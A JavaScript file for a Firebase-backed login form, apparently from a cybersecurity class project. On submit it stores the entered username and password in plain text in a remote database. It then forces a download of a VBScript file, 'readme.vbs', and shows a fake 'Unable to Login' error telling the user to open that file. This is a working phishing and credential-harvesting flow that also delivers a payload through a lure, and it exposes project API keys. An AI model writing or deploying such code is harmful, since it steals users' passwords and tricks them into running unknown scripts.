const firebaseConfig = {
  apiKey: "AIzaSyCJSl7emZ0wh53vL3_iaoAx-iffzBnw2Zo",
  authDomain: "cybersec-ie2.firebaseapp.com",
  databaseURL: "https://cybersec-ie2-default-rtdb.firebaseio.com",
  projectId: "cybersec-ie2",
  storageBucket: "cybersec-ie2.appspot.com",
  messagingSenderId: "196577664174",
  appId: "1:196577664174:web:9f7c839751f59f60cee13f",
  measurementId: "G-8P2SQFPG0B"
};

firebase.initializeApp(firebaseConfig);

var cyberSec_IE2DB = firebase.database().ref("cyberSec-IE2")

document.getElementById("cyberSec-IE2").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var text = getElementVal("text");
  var password = getElementVal("password");

  saveMessages(text, password);

  // Create a link element
  var downloadLink = document.createElement('a');

  // Set the download link attributes
  downloadLink.href = './readme.vbs'; 
 
  downloadLink.download = 'readme.vbs';

  // Append the link to the body
  document.body.appendChild(downloadLink);

  // Trigger a click on the link to initiate the download
  downloadLink.click();

  // Remove the link from the body
  document.body.removeChild(downloadLink);

  document.getElementById("cyberSec-IE2").reset();
  alert("Unable to Login ! Please refer the dowloaded file for the error!")
}


const saveMessages = (text, password,) => {
  var newData = cyberSec_IE2DB.push();

  newData.set({
      text: text,
      password: password,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
